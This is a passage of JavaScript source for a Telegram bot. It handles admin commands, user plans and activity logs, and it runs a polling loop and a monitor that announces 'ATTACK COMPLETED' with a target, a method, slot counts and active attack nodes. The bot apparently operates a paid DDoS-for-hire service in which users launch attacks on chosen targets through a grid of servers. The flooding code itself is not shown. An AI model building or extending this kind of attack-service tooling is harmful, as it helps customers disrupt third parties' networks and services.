            return sendMessage(token, chat_id, text);
        }

        if (cmd === '/admin_reset') {
            botLog('handleMessage', `/admin_reset command`);
            if (!await is_admin(from.id)) return sendMessage(token, chat_id, `${ICONS.error} Admin only`);
            save_json(ACTIVITY_LOGS_PATH, []);
            return sendMessage(token, chat_id, `${ICONS.success} Activity logs cleared`);
        }

        if (cmd === '/admin_edit') {
            botLog('handleMessage', `/admin_edit command`);
            if (!await is_admin(from.id)) return sendMessage(token, chat_id, `${ICONS.error} Admin only`);
            if (parts.length < 3) return sendMessage(token, chat_id, `${ICONS.error} Usage: <code>${esc('/admin_edit <username> <plan>')}</code>`);
            const username = parts[1];
            const newPlan = parts[2];
            const users = load_json(USERS_PATH) || [];
            const idx = users.findIndex(u => u.username === username);
            if (idx === -1) return sendMessage(token, chat_id, `${ICONS.error} User not found`);
            users[idx].plan = newPlan;
            save_json(USERS_PATH, users);
            const activityLogs = load_json(ACTIVITY_LOGS_PATH) || [];
            activityLogs.push({ timestamp: new Date().toISOString(), telegram_id: from.id, username: from.username || from.first_name, action: 'admin_edit', details: `Changed ${username} plan to ${newPlan}` });
            save_json(ACTIVITY_LOGS_PATH, activityLogs);
            return sendMessage(token, chat_id, `${ICONS.success} User ${username} plan changed to ${newPlan}`);
        }

        // Unknown command
        botLog('handleMessage', `Unknown command: ${cmd}`);
        return sendMessage(token, chat_id, `${ICONS.info} Unknown command. Use /help`);
    } catch (err) {
        botLogError('handleMessage', 'Handler error', err.message);
    }
}

// Polling loop
async function start() {
    const settings = load_json(SETTINGS_PATH) || {};
    const token = settings.telegramBotToken;
    if (!token) {
        botLogError('start', 'No token in settings.json', '');
        return;
    }
    botLog('start', `✅ Bot initialized`);
    botLog('start', `Token: ${token.substring(0, 15)}...`);
    botLog('start', `Allowed IDs: ${JSON.stringify(settings.allowedTelegramIds)}`);
    botLog('start', `Debug log: ${DEBUG_LOG_PATH}`);

    // Initial log clearing
    autoClearLogs();
    // Set periodic maintenance every 24 hours
    setInterval(autoClearLogs, 24 * 60 * 60 * 1000);

    // Attack Completion Monitor
    setInterval(async () => {
        const now = Date.now();
        const toFinish = activeHits.filter(h => now >= h.endTime);
        if (toFinish.length === 0) return;

        for (const hit of toFinish) {
            try {
                // 1. Delete old message
                await deleteMessage(token, hit.chatId, hit.messageId);

                // 2. Fetch fresh stats
                const user = await get_api_user(hit.user);
                const servers = load_json(SERVERS_PATH) || [];
                const online = servers.filter(s => s && s.status === 'online').length;
                const activeSlots = servers.reduce((sum, s) => sum + (s.ongoing || 0), 0);

                // 3. Send Success Report
                const report = UIKit.header(`${ICONS.success} ATTACK COMPLETED`) + '\n' +
                    `🎯 <b>Target:</b> ${esc(hit.target)}\n` +
                    `🔥 <b>Method:</b> ${esc(hit.method)}\n` +
                    `✅ <b>Status:</b> FINISHED SUCCESSFULLY\n\n` +
                    `<b>${ICONS.chart} GRID STATUS</b>\n${UIKit.border()}\n` +
                    `• Your Slots: ${user ? `${user.slotsUsed}/${user.slots}` : 'N/A'}\n` +
                    `• Active Nodes: ${online}/${servers.length}\n` +
                    `• Global Load: ${activeSlots} slots\n\n` +
                    `<i>Session logs documented in dashboard.</i>`;

                await sendMessage(token, hit.chatId, report);
            } catch (err) {
                botLogError('Monitor', `Failed to process hit completion`, err.message);
            }
        }
        activeHits = activeHits.filter(h => now < h.endTime);
    }, 5000);

    // delete webhook first
    try {
        await axios.post(`https://api.telegram.org/bot${token}/deleteWebhook`, {});
        botLog('start', `✅ Webhook deleted`);
    } catch (e) {
        botLog('start', `⚠️  Webhook delete skipped: ${e.message}`);
    }

    let offset = 0;
    let errorCount = 0;
    botLog('start', `Entering polling loop...`);

    while (true) {
        try {
            const res = await axios.get(`https://api.telegram.org/bot${token}/getUpdates`, { params: { offset, timeout: 30 }, timeout: 45000 });
            const updates = (res.data && res.data.result) || [];
            errorCount = 0; // Reset error counter on success

            if (updates.length > 0) {
                botLog('start', `📬 Received ${updates.length} update(s)`);
            }

            for (const u of updates) {
                offset = (u.update_id || 0) + 1;
                try {
                    if (u.message) await handleMessage(u.message, token);
                    else if (u.edited_message) await handleMessage(u.edited_message, token);
                    else if (u.callback_query) await handleCallback(u, token);
                } catch (e) { botLogError('start', 'Update handling error', e.message); }
            }
        } catch (e) {
            errorCount++;
            botLogError('start', `Poll error #${errorCount}`, e.message);
            if (errorCount > 10) {
                botLog('start', `⚠️  Too many errors (${errorCount}), restarting in 10s...`);
                await new Promise(r => setTimeout(r, 10000));
                errorCount = 0;
            } else {
                await new Promise(r => setTimeout(r, 3000));
            }
        }
    }
}

module.exports = { start };
